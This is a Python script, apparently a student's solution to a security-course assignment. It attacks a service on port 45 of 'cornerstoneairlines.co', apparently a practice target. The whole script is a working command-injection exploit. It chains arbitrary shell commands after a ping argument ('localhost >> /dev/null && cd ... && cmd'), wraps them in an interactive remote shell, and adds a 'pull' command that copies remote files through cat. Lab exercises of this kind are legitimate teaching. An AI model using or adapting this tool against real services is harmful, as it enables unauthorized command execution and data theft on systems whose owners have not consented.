"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here
pwd = '/'
shell = False
run = True

def execute_shell_cmd(cmd):
    global pwd
    if cmd == 'exit':
        global shell
        shell = False
        return

    # Handle cd
    inp = cmd.split(' ')
    if inp[0] == 'cd' and len(inp) > 1:
        # Absolute dirs
        if inp[1][0] == '/':
            pwd = inp[1]
        # Going back
        elif inp[1] == '..':
            # Chop off the last /
            pwd_l = pwd.split('/')[:-1]
            pwd = '/'.join(pwd_l)
            # Fix empty dir
            if pwd == '':
                pwd = '/'
        # Append relative dir
        else:
            if pwd == '/':
                pwd = ''
            pwd += "/{}".format(inp[1])
        return

    # Connect to website
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Sleep (to give the response time)
    time.sleep(1)

    # Read and throw away welcome message
    s.recv(1024)

    # Reroute ping data to /dev/null, cd to our pwd, and execute the command
    remote_cmd = "localhost >> /dev/null && cd {} && {}\n".format(pwd, cmd)
    s.send(remote_cmd.encode())

    # Print response
    data = s.recv(1024)
    return data.decode()

def execute_cmd(cmd):
    inp = cmd.split(' ')
    if cmd == 'quit':
        global run
        run = False
    elif cmd == 'shell':
        print("Entering shell, type exit to quit")
        global shell
        shell = True
    elif inp[0] == 'pull' and len(inp) == 3:
        # Get file from server using cat
        # TODO: Flag to read more bytes from execute_shell_cmd in case of bigger file
        res = execute_shell_cmd('cat {}'.format(inp[1]))

        # Open file for writing
        file = open(inp[2], "w")
        file.write(res)
        file.close()
    else:
        print('Commands:')
        print('shell - Drop into an interactive shell on the server')
        print('pull <remote-path> <local-path> - Download files')
        print('help - Show this help menu')
        print('quit - Quit the shell')


if __name__ == '__main__':
    while run:
        if shell:
            inp = input("{}>".format(pwd))
            res = execute_shell_cmd(inp)
            if res != None:
                print(res)
        else:
            inp = input('>')
            execute_cmd(inp)
